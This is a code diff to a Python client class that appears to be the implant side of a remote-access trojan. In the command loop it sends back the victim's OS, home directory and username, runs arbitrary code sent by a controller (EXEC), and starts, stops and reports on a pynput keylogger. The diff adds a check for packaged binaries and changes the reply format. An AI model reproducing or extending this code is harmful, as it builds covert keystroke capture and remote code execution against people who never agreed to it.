@@ -358,6 +358,10 @@ class Client(object):
                 self.send(json.dumps([platform.system(), os.path.expanduser('~'), getpass.getuser()]).encode())
                 continue
 
+            if data[0] == 'FROZEN':
+                self.send(json_dumps(getattr(sys, 'frozen', False)).encode())
+                continue
+
             if data[0] == 'EXEC':
                 old_stdout = sys.stdout
                 redirected_output = sys.stdout = StringIO()
@@ -450,30 +454,30 @@ class Client(object):
 
             if data[0] == 'START_KEYLOGGER':
                 if not _pynput:
-                    self.send(json_dumps([False]))
+                    self.send(json_dumps(False))
                     continue
                 if not KeyListener.running:
                     KeyListener.start()
                     logging.info('Started Keylogger')
-                self.send(json_dumps([True]))
+                self.send(json_dumps(True))
                 continue
 
             if data[0] == 'KEYLOGGER_STATUS':
                 if not _pynput or not KeyListener.running:
-                    self.send(json_dumps([False]))
+                    self.send(json_dumps(False))
                     continue
-                self.send(json_dumps([True]))
+                self.send(json_dumps(True))
                 continue
 
             if data[0] == 'STOP_KEYLOGGER':
                 if not _pynput:
-                    self.send(json_dumps([False]))
+                    self.send(json_dumps(False))
                     continue
                 if KeyListener.running:
                     logging.info('Stopped Keylogger')
                     KeyListener.stop()
                     threading.Thread.__init__(KeyListener) # re-initialise thread
-                self.send(json_dumps([True]))
+                self.send(json_dumps(True))
                 continue
 
             if data[0] == 'COPY':
